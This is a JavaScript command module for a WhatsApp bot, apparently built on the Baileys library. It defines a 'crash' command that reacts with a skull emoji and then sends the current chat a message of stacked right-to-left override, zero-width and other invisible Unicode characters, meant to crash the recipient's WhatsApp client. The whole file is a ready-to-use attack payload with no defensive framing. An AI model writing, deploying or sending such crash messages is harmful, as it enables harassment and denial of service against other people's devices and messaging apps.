export default {
  name: 'crash',
  alias: ['crashwa', 'crashbug', 'wa_crash'],
  description: 'Send a WhatsApp crash bug message',
  category: 'bug',

  async execute(sock, m, args, PREFIX) {
    const jid = m.key.remoteJid;

    const bidi   = '\u202E';
    const zwsp   = '\u200B';
    const zwnj   = '\u200C';
    const zwj    = '\u200D';
    const lrm    = '\u200E';
    const rlm    = '\u200F';
    const wj     = '\u2060';

    const payload =
      bidi.repeat(30) +
      zwsp.repeat(50) +
      zwnj.repeat(50) +
      zwj.repeat(50) +
      lrm.repeat(30) +
      rlm.repeat(30) +
      wj.repeat(20) +
      '\uFEFF'.repeat(20) +
      '\u034F'.repeat(30);

    try {
      await sock.sendMessage(jid, { react: { text: '💀', key: m.key } });
      await sock.sendMessage(jid, { text: payload }, { quoted: m });
    } catch (err) {
      await sock.sendMessage(jid, {
        text: `❌ Failed to send crash bug: ${err.message}`
      }, { quoted: m });
    }
  }
};
